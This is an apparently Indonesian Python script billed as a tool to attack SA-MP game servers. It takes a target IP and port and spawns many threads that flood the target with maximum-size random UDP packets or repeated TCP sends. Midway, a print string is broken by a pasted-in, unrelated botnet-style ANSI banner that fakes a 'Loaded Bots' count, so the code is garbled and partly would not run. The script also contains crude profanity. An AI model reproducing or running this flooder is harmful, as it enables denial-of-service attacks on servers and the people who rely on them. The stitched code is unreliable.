#!/usr/bin/env python3
import random
import socket
import threading
import os
import sys

os.system("clear")
print("Tools By Asep Hengkel")
print("😈ATTACK SAMP SERVER BY ASEP😈")
ip = str(input(" IP:"))
port = int(input(" Port:"))
choice = str(input(" UDP(y/n):"))
times = int(input(" Paket yang dikirim :"))
threads = int(input(" Utas (saran : 99999) :"))
def run():
    data = random._urandom(65507)
    i = random.choice(("[*]","[!]","[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
            print(i +" ASEP NI KIDS NANTI NANGIS")
        except:
            print("YAH GAK KUAT KONTOL")

def run2():
    data = random._urandom(65507)
    i = random.choice(("[*]","[!]","[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +" ```
print (f'''

\033[1;35m                     ╔════════════════════════════════════════╗
\033[1;35m                               \033[1;34m╦ ╦╦ ╦╔═╗╔═╗╦═╗  ═╗ ╦
\033[1;35m                               \033[35m╠═╣╚╦╝╠═╝║╣ ╠╦╝  ╔╩╦╝
\033[1;35m                               \033[1;34m╩ ╩ ╩ ╩  ╚═╝╩╚═  ╩ ╚═
\033[1;35m                     ╚════════════════════════════════════════╝
\033[1;34m                        ║  \033[37m      Subscribe Xylent         \033[1;34m║
\033[1;35m              ╔════════════════════════════════════════════════════════════╗
\033[1;34m                [\033[34m<>\033[1;34m] \033[37mHOST/IP              \033[1;34m:            [\033[34m<>\033[1;34m] \033[37m{host}
\033[1;34m                [\033[34m<>\033[1;34m] \033[37mPORT                 \033[1;34m:            [\033[34m<>\033[1;34m] \033[37m{port}
\033[1;34m                [\033[34m<>\033[1;34m] \033[37mMETHODS              \033[1;34m:            [\033[34m<>\033[1;34m] \033[37mHYPER-X
\033[1;35m              ╚════════════════════════════════════════════════════════════╝
\033[1;34m                             ║ \033[37m Loaded Bots: [{random.randrange(1, 10000)}]  \033[1;34m║
\033[1;34m                  ╔════════════════════════════════════════════════╗
\033[1;34m                  ║  \033[37m  Cnc Hyper X Build By Xylent 28/06/2023      \033[1;34m║       
\033[1;34m                  ╚════════════════════════════════════════════════╝
\033[0m
''')
```")
        except:
            s.close()
            print("YAH GAK KUAT KONTOL")

for y in range(threads):
    if choice == 'y':
        th = threading.Thread(target = run)
        th.start()
    else:
        th = threading.Thread(target = run2)
        th.start()